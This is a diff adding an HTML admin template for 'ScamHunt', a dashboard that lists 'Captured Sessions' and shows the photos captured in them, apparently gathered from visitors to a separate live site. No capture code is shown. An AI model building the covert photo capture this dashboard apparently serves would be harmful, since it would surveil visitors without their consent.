@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ScamHunt | Admin Portal</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='admin.css') }}">
+</head>
+<body>
+    <div class="dashboard">
+        <aside class="sidebar">
+            <div class="logo">
+                <i class="fas fa-shield-alt"></i>
+                <span>ScamHunt</span>
+            </div>
+            <nav>
+                <a href="#" class="active"><i class="fas fa-camera"></i> Captures</a>
+                <a href="/"><i class="fas fa-external-link-alt"></i> Live Site</a>
+            </nav>
+            <div class="status">
+                <div class="status-item">
+                    <span class="label">Status</span>
+                    <span class="value online">Online</span>
+                </div>
+            </div>
+        </aside>
+
+        <main class="content">
+            <header>
+                <div class="header-left">
+                    <h1>Captured Sessions</h1>
+                    <p>New captures appear on top</p>
+                </div>
+                <div class="header-right">
+                    <button id="refresh-btn" class="btn btn-primary">
+                        <i class="fas fa-sync-alt"></i> Refresh
+                    </button>
+                </div>
+            </header>
+
+            <div id="sessions-container" class="sessions-grid">
+                <!-- Sessions will be loaded here -->
+                <div class="loading">
+                    <i class="fas fa-circle-notch fa-spin"></i>
+                    <p>Loading sessions...</p>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Photo Modal -->
+    <div id="photo-modal" class="modal">
+        <span class="close">&times;</span>
+        <div class="modal-content">
+            <img id="modal-img" src="" alt="Full size photo">
+            <div id="modal-caption" class="caption"></div>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='admin.js') }}"></script>
+</body>
+</html>
